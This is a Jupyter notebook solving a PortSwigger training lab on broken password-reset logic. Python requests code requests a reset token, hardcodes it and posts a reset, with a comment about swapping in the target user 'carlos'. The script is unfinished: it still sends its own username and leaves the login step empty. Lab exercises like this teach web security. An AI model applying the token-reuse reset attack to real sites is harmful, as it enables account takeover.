{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "18218bfd",
   "metadata": {},
   "source": [
    "# Other - Password Reset Broken Logic\n",
    "[Lab is here](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c4ec230f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "from load_un_pw import get_un_pw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "28947063",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n<html>\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsBlog.css rel=stylesheet>\\n        <title>Password reset broken logic</title>\\n    </head>\\n    <body>\\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\\n        \\n        <div id=\"academyLabHeader\">\\n            <section class=\"academyLabBanner\">\\n                <div class=\"container\">\\n                    <div class=\"logo\"></div>\\n                        <div class=\"title-container\">\\n                            <h2>Password reset broken logic</h2>\\n                            <a id=\\'exploit-link\\' class=\\'button\\' target=\\'_blank\\' href=\\'https://exploit-ac591f821eefa63fc0031203013300fc.web-security-academy.net/email\\'>Email client</a>\\n                            <a class=\"link-back\" href=\"https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic\">\\n                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;\\n                                <svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 28 30\" enable-background=\"new 0 0 28 30\" xml:space=\"preserve\" title=\"back-arrow\">\\n                                    <g>\\n                                        <polygon points=\"1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\"></polygon>\\n                                        <polygon points=\"14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\"></polygon>\\n                                    </g>\\n                                </svg>\\n                            </a>\\n                        </div>\\n                        <div class=\"widgetcontainer-lab-status is-notsolved\">\\n                            <span>LAB</span>\\n                            <p>Not solved</p>\\n                            <span class=\"lab-status-icon\"></span>\\n                        </div>\\n                    </div>\\n                </div>\\n            </section>\\n        </div>\\n\\n        <div theme=\"blog\">\\n            <section class=\"maincontainer\">\\n                <div class=\"container is-page\">\\n                    <header class=\"navigation-header\">\\n                        <section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>\\n                    </header>\\n                    <header class=\"notification-header\">\\n                    </header>\\n                    <section class=\"blog-header\">\\n                        <img src=\"/resources/images/blog.svg\">\\n                    </section>\\n                    <section class=\"blog-list\">\\n                        <a href=\"/post?postId=2\"><img src=\"/image/blog/posts/39.jpg\"></a>\\n                        <h2>The Art Of Communication</h2>\\n                        <p>I\\'m a bit of a Francophile, so when I travel to France I love to speak their language. I\\'m by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=2\">View post</a>\\n                        <a href=\"/post?postId=10\"><img src=\"/image/blog/posts/23.jpg\"></a>\\n                        <h2>The Peopleless Circus</h2>\\n                        <p>When the leaflet dropped through my letterbox I thought it was a joke. The Peopleless Circus was in town. At the risk of sounding like a negative Nancy, I couldn\\'t help thinking what is the world coming to. I\\'m not...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=10\">View post</a>\\n                        <a href=\"/post?postId=7\"><img src=\"/image/blog/posts/7.jpg\"></a>\\n                        <h2>Faking It! - InstaCam</h2>\\n                        <p>People are going to extreme lengths to pull the wool over their friends\\' eyes on Social Media. If you\\'ve ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=7\">View post</a>\\n                        <a href=\"/post?postId=3\"><img src=\"/image/blog/posts/66.jpg\"></a>\\n                        <h2>Machine Parenting</h2>\\n                        <p>It has finally happened. The progression from using TV\\'s and tablets as a babysitter for your kids has evolved. Meet the droids, the 21st Century Machine Parenting bots who look just like mom and dad.</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=3\">View post</a>\\n                        <a href=\"/post?postId=9\"><img src=\"/image/blog/posts/43.jpg\"></a>\\n                        <h2>New Year - New Friends</h2>\\n                        <p>It\\'s always the same. A new year begins and those people you thought were your friends go, well, a bit weird. Your nearest and dearest, between them, have a very long list of things they want to change about themselves....</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=9\">View post</a>\\n                        <a href=\"/post?postId=8\"><img src=\"/image/blog/posts/13.jpg\"></a>\\n                        <h2>Lies, Lies & More Lies</h2>\\n                        <p>I remember the first time I told a lie. That\\'s not to say I didn\\'t do it before then, I just don\\'t remember. I was nine years old and at my third school already. Fitting into already established friendship groups...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=8\">View post</a>\\n                        <a href=\"/post?postId=5\"><img src=\"/image/blog/posts/44.jpg\"></a>\\n                        <h2>If I Close My Eyes You Can\\'t See Me</h2>\\n                        <p>A young man in Ohio was shocked to discover his Mom and Grandma had been witness to his inappropriate online behavior. Forgetting how everyone you have in your friendship circle is inextricably connected on social media, he didn\\'t hold back...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=5\">View post</a>\\n                        <a href=\"/post?postId=1\"><img src=\"/image/blog/posts/47.jpg\"></a>\\n                        <h2>Coping with Hangovers</h2>\\n                        <p>They say certain things get better with age, alas, not hangovers. I suppose the easiest thing to do would be to say well, just don\\'t drink in the first place but as well all know, human nature dictates that we...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=1\">View post</a>\\n                        <a href=\"/post?postId=6\"><img src=\"/image/blog/posts/58.jpg\"></a>\\n                        <h2>Awkward Breakups</h2>\\n                        <p>Tis better to have loved and lost than to never to have loved at all? A beautiful thought, but maybe Tennyson never had to go around his exe\\'s house to collect his parchment and quills after an awkward break up....</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=6\">View post</a>\\n                        <a href=\"/post?postId=4\"><img src=\"/image/blog/posts/67.jpg\"></a>\\n                        <h2>The Lies People Tell</h2>\\n                        <p>The best kind of lies are the ones you overhear other people telling. You know they are lying because you\\'re standing in a bar when you hear them on the phone saying, \\'I\\'m in the grocery store.\\' At times like...</p>\\n                        <a class=\"button is-small\" href=\"/post?postId=4\">View post</a>\\n                    </section>\\n                </div>\\n            </section>\\n        </div>\\n    </body>\\n</html>\\n'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "URL = \"https://ac941f0b1edfa619c02912bf00460094.web-security-academy.net/\"\n",
    "new_password = \"test\"\n",
    "target_username = \"carlos\"\n",
    "\n",
    "#Step 1: Generate a token for myself\n",
    "requests.post(URL + \"forgot-password\", data={\"username\" : \"wiener\"})\n",
    "\n",
    "#Step 2. Grab token from email\n",
    "token = {\"temp-forgot-password-token\" : \"aVpb5xpqzW7tIUJKdocOzWFh1z4LN4kQ\"}\n",
    "\n",
    "#Step 3. Attempt reset with different username\n",
    "r = requests.post(\n",
    "    URL + f\"forgot-password?temp-forgot-password-token={token['temp-forgot-password-token']}\",\n",
    "    data = token | {\"username\" : \"wiener\", \"new-password-1\" : \"test\", \"new-password-2\" : \"test\"})\n",
    "\n",
    "#Step 4. Login\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd26555f",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
